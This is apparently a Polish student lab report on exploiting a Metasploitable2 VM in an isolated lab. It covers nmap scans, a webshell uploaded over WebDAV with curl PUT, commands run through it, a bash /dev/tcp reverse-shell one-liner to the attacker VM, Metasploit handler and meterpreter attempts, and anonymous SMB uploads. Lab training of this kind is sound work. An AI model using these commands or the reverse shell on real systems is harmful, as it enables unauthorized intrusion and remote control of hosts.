# Day 9 — Lab report

**Autor:** Jacek Kozłowski
**Data:** 10.11.2025
**Środowisko:** Kali Linux (VM), Metasploitable2 (VM), VirtualBox sieć Host-Only / NAT (adresy 192.168.56.x)

---

## Cel

Przeprowadzenie skanowania sieci i usług na hoście Metasploitable (192.168.56.101), a następnie wykorzystanie dostępnej funkcjonalności WebDAV do uploadu prostego webshella i uzyskania zdalnego wykonania poleceń (post-exploitation). Zbadanie możliwości uruchomienia meterpreter session.

---

## Podsumowanie wykonanych kroków

1. **Sprawdzenie interfejsów i konfiguracji sieci**

   * `ip a` na Kali — widoczne interfejsy i przypisane adresy (np. 192.168.56.102/24)
   * upewnienie się, że oba VMy widzą się po 192.168.56.x

2. **Skanowanie szybkiego zakresu usług**

   * `sudo nmap -sS -sV -Pn -oN quick_services.txt 192.168.56.101`
   * Odkryte usługi (wybrane): ftp (vsftpd 2.3.4), ssh, telnet, smtp, dns (bind), http (Apache 2.2.8), rpcbind/nfs, samba (shares: tmp, opt, print$), proftpd na 2121, mysql, postgresql, vnc, tomcat itp.

3. **Testy HTTP i katalogów**

   * `curl http://192.168.56.101/` — w serwisie znalezione linki do: TWiki, phpMyAdmin, Mutillidae, DVWA, WebDAV (`/dav/`).
   * Enum katalogów: `gobuster`/`dirb` wykazały `/dav`, `/phpMyAdmin`, `/test`, `/twiki` itd.

4. **WebDAV**

   * Sprawdzenie: `curl -i -X OPTIONS http://192.168.56.101/dav/` zwrócił `DAV: 1,2` i listę metod wskazującą, że zapis przez WebDAV jest możliwy.
   * Upload prostego webshella (plik `shell.php`) metodą PUT:

     ```bash
     curl -v -T /tmp/shell.php http://192.168.56.101/dav/shell.php
     ```

     -> Serwer odpowiedział `201 Created` i `Location: http://192.168.56.101/dav/shell.php`.

5. **Uruchomienie komend przez webshell**

   * Wywołanie prostego polecenia:

     ```bash
     curl "http://192.168.56.101/dav/shell.php?cmd=whoami"
     ```

     -> Otrzymano odpowiedź: `www-data` (potwierdzenie, że PHP jest uruchamiany pod użytkownikiem www-data).

6. **Reverse shell / meterpreter attempts**

   * Próba uruchomienia prostego reverse-basha z użyciem `bash -i >& /dev/tcp/192.168.56.102/4444 0>&1` wymagała poprawnego zakodowania URL (znaki specjalne). Pomyślną metodą było użycie `--data-urlencode` lub wygenerowanie i upload PHP-payloadu.
   * Wygenerowano/ustawiono handler w Metasploit (multi/handler) na `LHOST=192.168.56.102` / `LPORT=4444` i uruchomiono nasłuch.
   * Próba uruchomienia PHP meterpretera (msfvenom -> upload -> curl) powinna dać sesję Meterpreter gdy handler jest poprawnie skonfigurowany i porty niezajęte.

7. **SMB (Samba) — zapis plików na share `tmp`**

   * `smbclient //192.168.56.101/tmp -N` — udało się połączyć anonimowo, lista plików (m.in. `pwn.txt`).
   * Upload pliku `shell.php` i `test_upload.txt` na share `tmp` powiódł się (`put /tmp/shell.php shell.php`). Jednak plik na samym share nie był pod bezpośrednim DocumentRootem — dlatego wykorzystano WebDAV aby plik trafił do `/dav/` (czyli dostepnego przez HTTP) lub sprawdzono DocumentRoot poprzez `phpinfo.php`.

8. **Archiwizacja wyników**

   * Wyniki skanów zapisane do plików: `nmap_full_2025-11-10.txt`, `quick_services.txt`, `nikto_http.txt`, `gobuster_2025-11-10.txt`, `smb_tmp_ls.txt` itd.

---

## Wybrane ważne surowe wyniki (skrót)

* `curl -v -T /tmp/shell.php http://192.168.56.101/dav/shell.php` -> HTTP/1.1 201 Created, Location: /dav/shell.php
* `curl "http://192.168.56.101/dav/shell.php?cmd=whoami"` -> `www-data`
* `nmap` (wybrane): ftp (vsftpd 2.3.4), http (Apache/2.2.8), proftpd (2121), mysql 5.0, postgresql 8.3, samba 3.0.20

(pełne logi i outputy zapisałem w plikach nmap_full_*.txt, quick_services.txt, nikto_http.txt, gobuster_*.txt itd. — dołączone do repo/lokalnego katalogu lab.)

---

## Wnioski i rekomendacje

* WebDAV na hoście był otwarty i umożliwił zapis pliku wykonywalnego PHP do ścieżki dostępnej przez HTTP — pozwoliło to na zdalne wykonanie poleceń (potwierdzone `whoami`).
* Poziom uprawnień webservera to `www-data` — dalsze działania post-exploitation powinny uwzględniać eskalację uprawnień (poszukać suid, słabych konfiguracji sudo, b.dostępnych plików konfiguracyjnych z hasłami itp.).
* Warto przeprowadzić: przeszukanie cronów, setuid binaries, plików konfiguracyjnych (phpMyAdmin, db), słabych haseł do usług (mysql/postgres), sprawdzić dostępność exploitów dla wykrytych wersji usług.

---

## Kolejne kroki (sugestia)

1. Spróbować wygenerować i uploadować PHP-meterpreter (msfvenom) i uruchomić handler (upewnić się, że handler nasłuchuje i port nie jest zajęty).
2. Zebranie informacji z webservera (pliki konfiguracyjne, dostępne serwisy webowe: DVWA, Mutillidae, TWiki, phpMyAdmin).
3. Zbadanie SMB `opt` (możliwy dostęp / zawartość).
4. Poszukiwanie eskalacji uprawnień na Metasploitable2.

---

## Załączniki / pliki utworzone lokalnie

* day9_scan.txt  (pełne nmap -sS -sV -O output)
* quick_services.txt
* nmap_full_2025-11-10.txt
* nikto_http.txt
* gobuster_2025-11-10.txt
* smb_tmp_ls.txt
* shell.php (webshell lokalnie w /tmp przed uploadem)

